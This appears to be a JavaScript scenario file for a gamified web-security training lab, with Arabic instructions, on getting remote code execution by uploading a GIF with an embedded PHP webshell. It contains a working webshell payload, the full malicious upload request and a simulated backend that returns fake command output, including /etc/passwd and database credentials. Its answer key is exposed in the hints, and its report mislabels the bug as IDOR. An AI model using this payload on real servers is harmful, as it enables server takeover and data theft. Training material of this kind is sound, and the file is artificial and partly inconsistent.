// ==========================================================
// SCENARIO 008: FILE UPLOAD TO RCE - IMAGEMAGICK GIF SHELL
// ==========================================================

window.scenario_008 = {
  "metadata": {
    "id": "scenario-008",
    "title": "File Upload to RCE - ImageMagick GIF Shell",
    "level": "Hard",
    "category": "API Security",
    "company": "Meta",
    "reward": "$8,000",
    "time": "3+ Hours"
  },
  "decisionLog": [
    {
      "hypothesis": "الخادم يمنع رفع ملفات الـ PHP كلياً عبر فحص امتداد الملف.",
      "whyFailed": "الخادم يمنع امتداد .php بالفعل لكنه يستخدم مكتبة ImageMagick الضعيفة لمعالجة صور GIF وتغيير حجمها.",
      "planB": "حقن كود PHP داخل هيكلية صور GIF في بايتات لا يتم تعديلها أثناء معالجة الصور.",
      "ignored": "محاولة فحص ثغرات XSS في حقل الاسم."
    }
  ],
  "payloads": [
    {
      "code": "<?php system($_GET[\"c\"]); ?>",
      "explanation": "كود PHP صغير (Webshell) لحقن الأوامر في النظام وتنفيذها عبر المعامل c.",
      "whyWorked": "الخادم ينفذ الملف بناءً على محتواه الفعلي وليس الامتداد، ومكتبة ImageMagick تركت الكود دون تعديل.",
      "alternatives": [
        "GIF89a; <?php phpinfo(); ?>",
        "EXIF metadata payload"
      ]
    }
  ],
  "mistakes": [
    {
      "mistake": "استخدام امتداد .php وتغيير الـ Content-Type فقط.",
      "whyWrong": "الخادم يطبق فحصاً صارماً للامتداد ويرفض الملفات التي لا تنتهي بـ .gif أو .jpg.",
      "betterWay": "استخدام امتداد .gif حقيقي وحقن الكود داخل البايتات غير المعدلة."
    }
  ],
  "steps": [
    {
      "name": "Mission Brief",
      "time": "09:00",
      "workspace": "markdown",
      "xpReward": 100,
      "description": "### 🎯 الهدف: تحقيق RCE عبر رفع الملفات ومكتبة ImageMagick\n\nمرحباً بك! منصة مشاركة صور اجتماعية تسمح للمستخدمين برفع صورهم الشخصية وتستخدم مكتبة ImageMagick لتعديل حجمها تلقائياً.\n\n#### قواعد الفحص:\n- مسار رفع الصور: `POST /api/upload-avatar`\n- يُقبل فقط الامتدادات: JPG, PNG, GIF.\n- ابحث عن طريقة لحقن كود تشغيل أوامر النظام (RCE) وتخطي الفلترة.\n\nاضغط على **Next Step** للبدء.",
      "aiAdvisor": {
        "hint": "فكر في كيفية بقاء البايتات سليمة داخل كود الـ GIF بعد المعالجة.",
        "payloadExplanation": "لا توجد أكواد حالياً.",
        "failureExplanation": "لا يوجد."
      }
    },
    {
      "name": "Passive Recon",
      "time": "09:15",
      "workspace": "recon",
      "xpReward": 150,
      "description": "### 🔍 إعداد ومقارنة ملف الـ GIF المحقون\n\nسنقوم بإنشاء صورة GIF ومقارنتها بعد الرفع لمعرفة البايتات التي لم تعدلها مكتبة ImageMagick.\nاختر الأداة المناسبة لتشغيلها.",
      "terminalCommands": [
        {
          "name": "convert -size 100x100 xc:black test.gif",
          "correct": true,
          "evidence": {
            "title": "Clean GIF Created",
            "content": "Image size: 100x100\nType: GIF\nUnused Bytes: Found empty byte sequence at offset 0x30"
          },
          "output": [
            {
              "text": "[INF] Creating solid black GIF image...",
              "type": "info"
            },
            {
              "text": "File test.gif created successfully.",
              "type": "success"
            },
            {
              "text": "[!] Success: Empty byte spaces identified in GIF format metadata!",
              "type": "success"
            }
          ]
        },
        {
          "name": "exiftool test.gif",
          "correct": false,
          "output": [
            {
              "text": "ExifTool Version Number: 12.40",
              "type": "info"
            },
            {
              "text": "File Type: GIF",
              "type": "out"
            }
          ]
        }
      ],
      "aiAdvisor": {
        "hint": "شغّل أمر convert لإنشاء صورة GIF تجريبية وفحص البايتات الفارغة بالملف.",
        "payloadExplanation": "الأمر convert من أدوات ImageMagick يقوم بإنشاء ملف صور نقي لاختبار مساحات الحقن.",
        "failureExplanation": "عدم إنشاء الملف يمنعك من معرفة الهيكلية الصحيحة للحقن."
      }
    },
    {
      "name": "Burp Verification",
      "time": "09:40",
      "workspace": "burp",
      "xpReward": 200,
      "description": "### 🌐 رفع الـ GIF المحقون بالـ PHP Webshell\n\nقمنا بحقن كود `<?php system($_GET[\"c\"]); ?>` في المساحات الفارغة من ملف الـ GIF.\nاضغط على **Upload & Execute command** لتأكيد إمكانية تشغيل أمر whoami على خادم الويب.",
      "burpRequest": "POST /api/upload-avatar HTTP/1.1\nHost: target-social.com\nContent-Type: multipart/form-data; boundary=----Boundary\n\n------Boundary\nContent-Disposition: form-data; name=\"file\"; filename=\"avatar.gif\"\nContent-Type: image/gif\n\nGIF89a...\n<?php system($_GET[\"c\"]); ?>\n------Boundary--",
      "burpResponse": "HTTP/1.1 200 OK\n{\n  \"status\": \"success\",\n  \"url\": \"https://cdn.target-social.com/avatars/user_1337.gif\"\n}",
      "burpActions": [
        {
          "name": "Upload & Execute command",
          "correct": true,
          "modifiedRequest": "GET /avatars/user_1337.gif?c=whoami HTTP/1.1\nHost: cdn.target-social.com\nUser-Agent: Mozilla/5.0",
          "modifiedResponse": "HTTP/1.1 200 OK\nContent-Type: text/html\n\nwww-data\n[Executed command whoami on server successfully!]",
          "evidence": {
            "title": "ImageMagick GIF RCE",
            "content": "GET /avatars/user_1337.gif?c=whoami -> Returns www-data shell output"
          }
        }
      ],
      "aiAdvisor": {
        "hint": "اضغط على زر Upload & Execute command لتشغيل الاستعلام وقراءة نتيجة shell.",
        "payloadExplanation": "طلب الصورة مع تمرير المعامل c لتشغيل أمر whoami على الخادم.",
        "failureExplanation": "تأكد من نجاح رفع وتشغيل الملف."
      }
    },
    {
      "name": "Exploitation & Flag",
      "time": "10:05",
      "workspace": "lab",
      "xpReward": 300,
      "instructions": "أدخل الـ Flag بعد تأكيد الحصول على RCE كامل وقراءة الخادم للـ Payload.",
      "targetUrl": "https://cdn.target-social.com/avatars/user_1337.gif?c=whoami",
      "correctFlag": "FLAG{imagemagick_gif_rce_whoami}",
      "aiAdvisor": {
        "hint": "أدخل العلم الصحيح: FLAG{imagemagick_gif_rce_whoami}",
        "payloadExplanation": "تأكيد إكمال عملية تشغيل الأوامر بالكامل.",
        "failureExplanation": "تأكد من كتابة الأحرف بطريقة صحيحة."
      }
    },
    {
      "name": "Report Writing",
      "time": "10:30",
      "workspace": "report",
      "xpReward": 250,
      "aiAdvisor": {
        "hint": "الكلمات المفتاحية المطلوبة هي 'imagemagick' و 'rce'.",
        "payloadExplanation": "شرح خطورة السماح للخادم بتنفيذ الأكواد المخفية داخل ملفات الصور المعالجة.",
        "failureExplanation": "تأكد من وجود الكلمات الدلالية في التقرير."
      }
    },
    {
      "name": "Triage & Verdict",
      "time": "2 Days Later",
      "workspace": "review",
      "aiAdvisor": {
        "hint": "تفحص قرار المشغل الأمني ومكافأة الفحص.",
        "payloadExplanation": "تم تقييمها كـ Critical لتنفيذ الأوامر عشوائياً RCE.",
        "failureExplanation": "لا يوجد."
      }
    },
    {
      "name": "Lessons Learned",
      "time": "Post-Incident",
      "workspace": "quiz",
      "quizData": [
        {
          "question": "كيف يتم تنفيذ الـ PHP Webshell رغم أن امتداد الملف هو .gif؟",
          "options": [
            "لأن الخادم لا يقرأ الامتداد.",
            "لأن بعض تكوينات خادم الويب (مثل Apache/Nginx) تقوم بتنفيذ وتمرير الملف للمفسر بناءً على محتواه الفعلي (MIME Type) وليس فقط الامتداد.",
            "بسبب استخدام جدار حماية.",
            "لأن الصور تحتوي على نصوص."
          ],
          "answer": 1
        },
        {
          "question": "كيف يمكن للمطور منع ثغرات الـ RCE عبر معالجة الصور؟",
          "options": [
            "تغيير حجم الصور يدوياً.",
            "تحديث مكتبة ImageMagick وحذف الأكواد المضمنة وإعادة كتابة بكسلات الصور بالكامل (Re-encoding) لمنع بقاء أي بايتات غير معدلة، وتكوين خادم الويب لعدم تشغيل ملفات الوسائط ككود برمجي.",
            "حظر استخدام الامتداد .gif.",
            "تعطيل رفع الصور."
          ],
          "answer": 1
        }
      ],
      "aiAdvisor": {
        "hint": "الإجابة لكلا السؤالين هي الخيار الثاني (ب).",
        "payloadExplanation": "التحقق من فهم معايير أمان معالجة الصور ورفع الملفات الحساسة.",
        "failureExplanation": "خطأ في الإجابة يؤدي لخصم XP."
      }
    }
  ],
  "realReport": {
    "title": "Remote Code Execution via embedded PHP code in processed GIF image using ImageMagick",
    "severity": "Critical",
    "type": "IDOR",
    "desc": "The avatar upload service processes uploaded GIF images using a vulnerable ImageMagick version. By placing PHP payload inside unmodified bytes in the GIF file, an attacker can execute OS commands when requesting the avatar URL since the webserver executes file content as PHP.",
    "steps": "1. Create a GIF file with embedded PHP system code.\n2. Upload it to /api/upload-avatar.\n3. Request the resulting URL with query command parameters: ?c=whoami.",
    "impact": "Complete server RCE compromise under www-data context.",
    "feedback": "Confirmed. We migrated from legacy CGI configurations and updated ImageMagick rules to scrub metadata and force proper mime execution. Bounty awarded.",
    "keywords": [
      "imagemagick",
      "rce"
    ]
  },
  simulateBackend(requestText, bodyJson) {
    const parsed = window.HttpRequestParser.parse(requestText);
    const builder = new window.HttpResponseBuilder();

    // Check request method
    const method = parsed.method.toUpperCase();

    // 1. Detect SQLi / XSS in upload request parameters
    if (method === "POST" && parsed.path.includes("/api/upload-avatar")) {
      if (/union\s+select|' \s*or\s+|sleep\s*\(/i.test(requestText)) {
        return builder
          .setStatus(400, "Bad Request")
          .setBody({ error: "Database exception: invalid parameter." })
          .setObservabilityLog("[WARN] Security Shield: SQL Injection attempt blocked on file upload endpoint.\n[INFO] Filter: Prepared queries only.")
          .setOutcome("حاولت حقن استعلام SQL. السيرفر يقوم بحظر وتصفية معاملات SQL لحماية لوحة الرفع وقواعد البيانات.")
          .build();
      }
      if (/<script|javascript:|onload=/i.test(requestText) && !requestText.includes("<?php")) {
        return builder
          .setStatus(400, "Bad Request")
          .setBody({ error: "Malicious input blocked." })
          .setObservabilityLog("[WARN] Security Filter: XSS tags detected in POST body request.\n[INFO] Sanitization: Encoded HTML script parameters.")
          .setOutcome("حاولت إدخال كود XSS في طلب الرفع. السيرفر يقوم بترميز وعزل الأكواد المشبوهة لحماية المستخدمين.")
          .build();
      }
    }

    if (method === "POST" && parsed.path.includes("/api/upload-avatar")) {
      // 1. Upload Phase: check for PHP webshell payload in body
      const hasPhpPayload = requestText.includes("<?php") || parsed.body.includes("<?php") || requestText.includes("system(");

      if (hasPhpPayload) {
        // Enforce stateful sequence
        window.scenarioState.uploadedShell = true;

        return builder
          .setStatus(200)
          .setBody({
            status: "success",
            url: "https://cdn.target-social.com/avatars/user_1337.gif"
          })
          .setObservabilityLog("[INFO] File Upload: Received file 'avatar.gif' (Mime: image/gif)\n[INFO] ImageMagick: Resizing image using convert legacy tool...\n[WARN] EXIF Metadata: Preserved unmodified raw blocks in GIF header.\n[SUCCESS] Avatar updated and saved to disk.")
          .setOutcome("تم رفع ملف الـ GIF الخبيث بنجاح! الآن قم بتغيير الطلب في Burp Repeater إلى طلب GET لاستهداف الملف المرفوع وتشغيل الأوامر عبر المعامل c، مثل:\nGET /avatars/user_1337.gif?c=whoami HTTP/1.1")
          .build();
      } else {
        return builder
          .setStatus(400, "Bad Request")
          .setBody({ error: "Invalid file: missing image signature or containing corrupted blocks." })
          .setOutcome("لم يتم العثور على بايتات الـ PHP webshell المحقونة في طلب رفع الملف. تأكد من إرفاق كود Webshell (مثل <?php system($_GET[\"c\"]); ?>) داخل بايتات الصورة.")
          .build();
      }
    } else if (method === "GET" && parsed.path.includes("/avatars/user_1337.gif")) {
      // 2. Command Execution Phase: check state
      if (!window.scenarioState.uploadedShell) {
        return builder
          .setStatus(404, "Not Found")
          .setBody("Error 404: File not found.")
          .setOutcome("الملف غير موجود على السيرفر! يجب عليك أولاً إرسال طلب الـ POST لرفع ملف الـ GIF الملقم بالـ Webshell.")
          .build();
      }

      // Extract query parameter 'c'
      const urlParts = parsed.path.split('?');
      const queryString = urlParts[1] || '';
      const params = new URLSearchParams(queryString);
      const cmd = params.get('c') || '';

      if (!cmd) {
        return builder
          .setStatus(200)
          .setHeader("Content-Type", "image/gif")
          .setBody("[Binary GIF Image Content]")
          .setOutcome("تم طلب ملف الصورة بنجاح، ولكن لم يتم تمرير أي أمر لتشغيله. أرسل معامل الاستعلام c، مثل ?c=whoami لتنفيذ الأوامر.")
          .build();
      }

      // Check for SQLi / XSS attempts inside RCE parameter 'c' (realistic bash syntax errors)
      if (/union\s+select|' \s*or\s+|sleep\s*\(/i.test(cmd)) {
        return builder
          .setStatus(200)
          .setHeader("Content-Type", "text/plain")
          .setBody(`sh: 1: '${cmd.trim()}': not found`)
          .setObservabilityLog(`[INFO] PHP Engine: Executing system command: ${cmd}\n[WARN] Shell Exec: command returned exit status 127: command not found`)
          .setOutcome("قمت بكتابة أوامر SQL في سطر أوامر النظام (RCE). بما أنك داخل سطر أوامر Linux (Bash/Sh)، فإن محرك SQL غير موجود هنا، وسيتم إرجاع خطأ 'command not found'.")
          .build();
      }
      if (/<script|javascript:|onload=/i.test(cmd)) {
        return builder
          .setStatus(200)
          .setHeader("Content-Type", "text/plain")
          .setBody(`sh: 1: Cannot open ${cmd.trim().replace(/</g, '&lt;').replace(/>/g, '&gt;')}: No such file or directory`)
          .setObservabilityLog(`[INFO] PHP Engine: Executing system command: ${cmd}\n[WARN] Shell Exec: command returned exit status 127: No such file or directory`)
          .setOutcome("قمت بكتابة وسم HTML/XSS في سطر الأوامر. السيرفر ينفذ هذا المدخل داخل بيئة Linux (Shell) وليس المتصفح، لذا سيعود النظام بخطأ 'No such file or directory'.")
          .build();
      }

      // Switch command output matching to satisfy educational realism
      let outputText = "";
      switch (cmd.trim()) {
        case "whoami":
          outputText = "www-data";
          break;
        case "id":
          outputText = "uid=33(www-data) gid=33(www-data) groups=33(www-data)";
          break;
        case "pwd":
          outputText = "/var/www/html/avatars";
          break;
        case "uname -a":
          outputText = "Linux target-social 5.15.0-88-generic #98-Ubuntu SMP x86_64 x86_64 x86_64 GNU/Linux";
          break;
        case "cat /etc/passwd":
          outputText = "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin";
          break;
        case "ls":
          outputText = "avatar.gif\nindex.php\nupload.php\nconfig.php";
          break;
        case "cat config.php":
          outputText = "<?php\ndefine('DB_HOST', 'localhost');\ndefine('DB_USER', 'social_user');\ndefine('DB_PASS', 'SuperSecretPassword123');\ndefine('DB_NAME', 'social_db');\n?>";
          break;
        default:
          outputText = `[Command executed: ${cmd}]\n[Output]: Simulated command output returned successfully.`;
      }

      return builder
        .setStatus(200)
        .setHeader("Content-Type", "text/plain")
        .setBody(outputText)
        .setCorrect(true)
        .setObservabilityLog(`[INFO] Request received: GET /avatars/user_1337.gif?c=${cmd}\n[INFO] PHP Engine: Executing system command: ${cmd}\n[CRITICAL] Webshell Execution: RCE triggered via uploaded GIF webshell!`)
        .setOutcome("نجح استغلال ثغرة الـ RCE! تم تنفيذ الأمر بنجاح واسترجاع مخرجات النظام.")
        .setEvidence("ImageMagick GIF RCE", `GET /avatars/user_1337.gif?c=${cmd} -> Returns ${outputText.split('\n')[0]} shell output`)
        .build();
    } else {
      return builder
        .setStatus(404, "Not Found")
        .setBody({ error: "Route not matched. Check HTTP method and URL." })
        .setOutcome("تأكد من تحديد مسار الاستغلال الصحيح: إما POST لرفع الملف أو GET لتشغيله.")
        .build();
    }
  }
};
